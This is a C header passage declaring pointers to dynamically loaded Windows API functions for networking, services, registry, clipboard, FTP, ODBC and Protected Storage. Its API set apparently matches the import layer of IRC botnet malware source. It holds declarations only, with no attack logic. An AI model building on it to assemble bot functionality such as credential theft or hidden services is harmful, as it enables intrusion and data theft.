
// kernel32.dll function variables
extern GCNA fGetComputerName;

// user32.dll function variables
extern SM fSendMessage;
extern CW fCloseWindow;
extern IW fIsWindow;
extern OC fOpenClipboard;
extern GCD fGetClipboardData;
extern CC fCloseClipboard;

// advapi32.dll function variables
extern ROKE fRegOpenKeyEx;
extern RQVE fRegQueryValueEx;
extern RCK fRegCloseKey;
extern OSCM fOpenSCManager;
extern CRS fCreateService;
extern SS fStartService;
extern OS fOpenService;
extern CSH fCloseServiceHandle;
extern SSCD fStartServiceCtrlDispatcher;
extern ESS fEnumServicesStatus;
extern CS fControlService;
extern DS fDeleteService;
extern IVSD fIsValidSecurityDescriptor;
extern ILOU fImpersonateLoggedOnUser;
extern LSD fLockServiceDatabase;
extern QSLS fQueryServiceLockStatus;
extern CSC2 fChangeServiceConfig2;
extern USD fUnlockServiceDatabase;
extern RSCH fRegisterServiceCtrlHandler;
extern SSS fSetServiceStatus;

// ws2_32.dll function variables
extern WSAS fWSAStartup;
extern WSASo fWSASocket;
extern WSAGLE fWSAGetLastError;
extern WSAFDIS __fWSAFDIsSet;
extern WSAC fWSACleanup;
extern SOCK fsocket;
extern CON fconnect;
extern INTOA finet_ntoa;
extern IADDR finet_addr;
extern HTONS fhtons;
extern HTONL fhtonl;
extern SEND fsend;
extern SENDTO fsendto;
extern RECV frecv;
extern BIND fbind;
extern SEL fselect;
extern LIS flisten;
extern ACC faccept;
extern SSO fsetsockopt;
extern GSN fgetsockname;
extern GHN fgethostname;
extern GHBN fgethostbyname;
extern GPN fgetpeername;
extern CLSO fclosesocket;
extern SD fshutdown;

// wininet.dll function variables
extern IGCS fInternetGetConnectedState;
extern IGCSE fInternetGetConnectedStateEx;
extern HOR fHttpOpenRequest;
extern HSR fHttpSendRequest;
extern FGF fFtpGetFile;
extern FPF fFtpPutFile;
extern IC fInternetConnect;
extern IO fInternetOpen;
extern IOU fInternetOpenUrl;
extern ICU fInternetCrackUrl;
extern IRF fInternetReadFile;
extern ICH fInternetCloseHandle;

// dnsapi.dll function variables
extern DFRC fDnsFlushResolverCache;
extern DFRCEA fDnsFlushResolverCacheEntry_A;

// iphlpapi.dll function variables
extern GIT fGetIfTable;
extern GINT fGetIpNetTable;
extern DINE fDeleteIpNetEntry;
extern GTT fGetTcpTable;
extern GUT fGetUdpTable;

// mpr.dll function variables
extern WNAC2 fWNetAddConnection2;
extern WNAC2W fWNetAddConnection2W;
extern WNCC2 fWNetCancelConnection2;
extern WNCC2W fWNetCancelConnection2W;

// shell32.dll function variables
extern SE fShellExecute;
extern SHCN fSHChangeNotify;

// odbc32.dll function variables
extern SQLDC fSQLDriverConnect;
extern SQLSEA fSQLSetEnvAttr;
extern SQLED fSQLExecDirect;
extern SQLAH fSQLAllocHandle;
extern SQLFH fSQLFreeHandle;
extern SQLD fSQLDisconnect;
extern PRFS fPathRemoveFileSpec;

// psapi function variables
//extern GMFNE fGetModuleFileNameEx;
//extern GMBN fGetModuleBaseName;
//extern EPM fEnumProcessModules;
//extern EP fEnumProcesses;
//extern GPMI fGetProcessMemoryInfo;

#ifndef NO_PSTORE
//pstorec.dll function variables
extern PSCI fPStoreCreateInstance;
#endif

// globals for dynamic libraries
extern BOOL nokernel32;
extern BOOL nouser32;
extern BOOL noadvapi32;
extern BOOL noadvapi32lsa;
extern BOOL nogdi32;
extern BOOL nows2_32;
extern BOOL nowininet;
extern BOOL noicmp;
extern BOOL nonetapi32;
extern BOOL nodnsapi;
extern BOOL noiphlpapi;
extern BOOL noiphlpapinsp;
extern BOOL nompr;
extern BOOL noshell32;
extern BOOL noodbc32;
extern BOOL noavicap32;
extern BOOL nopsapi;
extern BOOL nopstore;
extern BOOL noshlwapi;
